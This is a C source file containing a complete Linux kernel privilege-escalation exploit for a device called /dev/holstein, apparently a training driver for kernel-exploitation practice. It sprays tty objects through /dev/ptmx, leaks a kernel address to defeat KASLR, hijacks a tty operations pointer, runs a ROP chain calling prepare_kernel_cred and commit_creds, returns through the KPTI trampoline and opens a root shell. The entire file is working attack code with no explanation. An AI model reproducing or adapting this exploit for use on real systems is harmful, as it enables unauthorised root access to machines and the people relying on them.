#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

uintptr_t cs;
uintptr_t rflags;
uintptr_t rsp;
uintptr_t ss;

uintptr_t offset;
#define OFFSET(addr) (addr + offset)

uintptr_t g_buf;

uintptr_t push_rdx_pop_rsp		= 0xffffffff813a478a;
uintptr_t pop_rdi_add_cl_cl_ret		= 0xffffffff81032f59;
uintptr_t prepare_kernel_cred		= 0xffffffff81074650;
uintptr_t pop_rcx_ret			= 0xffffffff8140c7b3;
uintptr_t mov_rdi_rax_rep_movsq_ret	= 0xffffffff8162707b;
uintptr_t commit_creds			= 0xffffffff810744b0;
uintptr_t kpti				= 0xffffffff81800e26;

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static void shell(void)
{
	puts("[+] get r00t!");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

static void leak_offset_and_g_buf(int fd, unsigned char *data)
{
	uintptr_t ptr;

	read(fd, data, 0x440);
	ptr = *(uintptr_t *)&data[0x418];
	offset = ptr - 0xffffffff81c38880;
	printf("[+] offset %p\n", offset);

	g_buf = *(uintptr_t *)&data[0x438] - 0x438;
	printf("[+] g_buf %p\n", g_buf);
}

int main(void)
{
	unsigned char data[0x500] = { 0 };
	uintptr_t *stack;
	int tty[100];
	int fd;

	save_state();

	for (int i = 0; i < 50; ++i) {
		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (tty[i] == -1) {
			perror("[-] open");
			return EXIT_FAILURE;
		}
	}

	fd = open("/dev/holstein", O_RDWR);
	if (fd == -1) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	for (int i = 50; i < 100; ++i) {
		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (tty[i] == -1) {
			perror("[-] open");
			return EXIT_FAILURE;
		}
	}

	leak_offset_and_g_buf(fd, data);

	*(uintptr_t *)&data[0x0c * 8] = OFFSET(push_rdx_pop_rsp);
	*(uintptr_t *)&data[0x418] = g_buf;

	stack = (uintptr_t *)&data[0x200];
	*stack++ = OFFSET(pop_rdi_add_cl_cl_ret);
	*stack++ = (uintptr_t)NULL;
	*stack++ = OFFSET(prepare_kernel_cred);
	*stack++ = OFFSET(pop_rcx_ret);
	*stack++ = 0;
	*stack++ = OFFSET(mov_rdi_rax_rep_movsq_ret);
	*stack++ = OFFSET(commit_creds);
	*stack++ = OFFSET(kpti);
	*stack++ = 0;
	*stack++ = 0;
	*stack++ = (uintptr_t)shell;
	*stack++ = cs;
	*stack++ = rflags;
	*stack++ = rsp;
	*stack++ = ss;

	write(fd, data, 0x420);

	for (int i = 0; i < 100; ++i)
		ioctl(tty[i], 0, g_buf + 0x200 - 0x10);

	close(fd);
	return EXIT_SUCCESS;
}
